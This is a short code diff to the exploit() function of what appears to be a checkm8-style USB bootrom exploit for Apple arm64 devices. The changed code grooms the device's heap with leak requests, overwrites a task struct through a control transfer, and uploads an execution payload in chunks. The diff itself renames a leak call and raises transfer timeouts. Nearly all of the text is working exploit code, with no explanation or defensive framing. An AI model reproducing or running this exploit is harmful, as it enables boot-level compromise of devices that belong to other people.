@@ -474,7 +474,7 @@ def exploit():
         device.stall()
         for i in range(config.hole):
             device.no_leak()
-        device.leak()
+        device.usb_req_leak()
         device.no_leak()
 
     device.usb_reset()
@@ -502,12 +502,12 @@ def exploit():
             device.usb_req_leak()
 
     # This overwrites the task struct
-    device.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, config.overwrite, 50)
+    device.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, config.overwrite, 100)
 
     # upload the payload, or actually, this is after the pwning happens and this is exec
     # this is usb_0xA1_2_arm64 and checkm8_arm64
     for i in range(0, len(payload), 0x800):
-        device.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, payload[i:i + 0x800], 50)
+        device.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, payload[i:i + 0x800], 100)
 
     # print("trigger")
     device.usb_reset()
